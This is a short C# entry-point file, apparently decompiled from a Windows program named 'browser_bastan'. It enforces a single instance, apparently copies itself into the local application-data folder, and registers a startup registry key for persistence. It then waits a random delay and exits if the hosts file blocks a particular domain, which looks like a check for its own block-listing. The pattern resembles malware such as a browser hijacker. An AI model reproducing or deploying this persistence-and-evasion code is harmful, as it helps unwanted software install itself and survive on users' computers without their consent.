using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace browser_bastan;

internal static class Program
{
	public static Mutex AppMutex = new Mutex(initiallyOwned: true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04X6FDSLO}");

	[STAThread]
	private static void Main()
	{
		if (AppMutex.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			CheckHostsFile();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Araclar.DstName;
			Araclar.DstCheck();
			Araclar.Startup(Araclar.Regkeyname, path);
			Random random = new Random();
			Thread.Sleep(random.Next(5000, 60000));
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Form1 form = new Form1();
			Application.Run((Form)(object)form);
			AppMutex.ReleaseMutex();
		}
		else
		{
			Environment.Exit(1);
		}
	}

	public static void CheckHostsFile()
	{
		string text = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\system32\\drivers\\etc\\hosts");
		if (text.Contains("nurullahuzmez.com"))
		{
			Environment.Exit(1);
		}
	}
}
